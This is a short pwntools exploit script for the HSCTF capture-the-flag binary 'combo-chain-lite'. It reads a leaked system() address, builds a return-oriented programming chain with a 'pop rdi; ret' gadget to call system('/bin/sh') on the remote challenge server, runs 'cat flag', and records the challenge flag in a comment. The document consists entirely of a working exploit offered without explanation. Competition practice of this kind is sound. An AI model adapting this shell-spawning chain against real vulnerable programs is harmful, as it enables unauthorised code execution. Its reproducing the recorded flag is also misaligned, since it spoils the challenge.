from pwn import *
local = False
host = 'localhost' if local else 'pwn.hsctf.com'
port = 1337 if local else 3131


if __name__=='__main__':
    s = remote(host, port)
    prog = ELF('combo-chain-lite')
    rop=ROP(prog)

    gadget = 'pop rdi;\s* ret'
    popret = int([hex(x) for x in rop.gadgets if re.match(gadget, rop.describe(x))][0], 16)


    leak_sys = s.recvuntil('\n').decode()
    print(leak_sys)
    leak_sys = leak_sys.split()[-1]
    binsh = 0x402051
    leak_sys = int(leak_sys, 16)
    print(s.recvuntil(':').decode())
    print(hex(leak_sys))
    payload = b'a'*8
    s.send(payload+p64(popret)*2+p64(binsh)+p64(leak_sys)+p64(binsh)+b'\n')
    s.sendline('cat flag')
    print(s.recvline().decode())
    s.close()

    # Flag = hsctf{wheeeeeee_that_was_fun}


    
